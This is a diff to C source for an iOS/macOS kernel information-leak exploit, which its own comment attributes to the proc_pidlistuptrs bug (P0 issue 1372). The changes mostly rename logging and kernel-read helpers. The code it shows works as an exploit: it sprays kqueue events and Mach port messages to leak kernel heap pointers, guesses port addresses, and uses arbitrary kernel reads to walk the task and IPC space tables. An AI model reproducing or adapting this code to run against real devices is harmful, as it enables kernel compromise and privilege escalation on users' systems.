@@ -8,6 +8,7 @@
 #include "kmem.h"
 #include "offsets.h"
 #include "kutils.h"
+#include <common.h>
 
 /*
  * this is an exploit for the proc_pidlistuptrs bug (P0 issue 1372)
@@ -67,7 +68,7 @@ static void fill_events(int n_events) {
                         KEVENT_FLAG_WORKLOOP | KEVENT_FLAG_IMMEDIATE);
     
     if (err != 0) {
-      printf(" [-] failed to enqueue user event\n");
+      LOG(" [-] failed to enqueue user event\n");
       exit(EXIT_FAILURE);
     }
     
@@ -84,7 +85,7 @@ static void prepare_kqueue() {
     return;
   }
   fill_events(10000);
-  printf(" [+] prepared kqueue\n");
+  LOG(" [+] prepared kqueue\n");
   kqueues_allocated = 1;
 }
 
@@ -122,7 +123,7 @@ static mach_port_t fill_kalloc_with_port_pointer(mach_port_t target_port, int co
   kern_return_t err;
   err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &q);
   if (err != KERN_SUCCESS) {
-    printf(" [-] failed to allocate port\n");
+    LOG(" [-] failed to allocate port\n");
     exit(EXIT_FAILURE);
   }
   
@@ -157,7 +158,7 @@ static mach_port_t fill_kalloc_with_port_pointer(mach_port_t target_port, int co
                  MACH_PORT_NULL);
   
   if (err != KERN_SUCCESS) {
-    printf(" [-] failed to send message: %s\n", mach_error_string(err));
+    LOG(" [-] failed to send message: %s\n", mach_error_string(err));
     exit(EXIT_FAILURE);
   }
   
@@ -187,7 +188,7 @@ uint64_t find_port_via_proc_pidlistuptrs_bug(mach_port_t port, int disposition) 
     mach_port_t q = fill_kalloc_with_port_pointer(port, i, disposition);
     mach_port_destroy(mach_task_self(), q);
     uint64_t leaked = try_leak(i-1);
-    //printf("leaked %016llx\n", leaked);
+    //LOG("leaked %016llx\n", leaked);
     
     // a valid guess is one which looks a bit like a kernel heap pointer
     // without the upper byte:
@@ -197,7 +198,7 @@ uint64_t find_port_via_proc_pidlistuptrs_bug(mach_port_t port, int disposition) 
   }
   
   if (valid_guesses == 0) {
-    printf(" [-] couldn't leak any kernel pointers\n");
+    LOG(" [-] couldn't leak any kernel pointers\n");
     exit(EXIT_FAILURE);
   }
   
@@ -222,7 +223,7 @@ uint64_t find_port_via_proc_pidlistuptrs_bug(mach_port_t port, int disposition) 
     }
   }
   
-  //printf("best guess is: 0x%016llx with %d%% of the valid guesses for it\n", best_guess, (best_guess_count*100)/valid_guesses);
+  //LOG("best guess is: 0x%016llx with %d%% of the valid guesses for it\n", best_guess, (best_guess_count*100)/valid_guesses);
   
   free(guesses);
   
@@ -232,16 +233,16 @@ uint64_t find_port_via_proc_pidlistuptrs_bug(mach_port_t port, int disposition) 
 uint64_t find_port_via_kmem_read(mach_port_name_t port) {
   uint64_t task_port_addr = task_self_addr();
   
-  uint64_t task_addr = rk64(task_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
+  uint64_t task_addr = ReadAnywhere64(task_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
   
-  uint64_t itk_space = rk64(task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
+  uint64_t itk_space = ReadAnywhere64(task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
   
-  uint64_t is_table = rk64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
+  uint64_t is_table = ReadAnywhere64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
   
   uint32_t port_index = port >> 8;
   const int sizeof_ipc_entry_t = 0x18;
   
-  uint64_t port_addr = rk64(is_table + (port_index * sizeof_ipc_entry_t));
+  uint64_t port_addr = ReadAnywhere64(is_table + (port_index * sizeof_ipc_entry_t));
   return port_addr;
 }
 
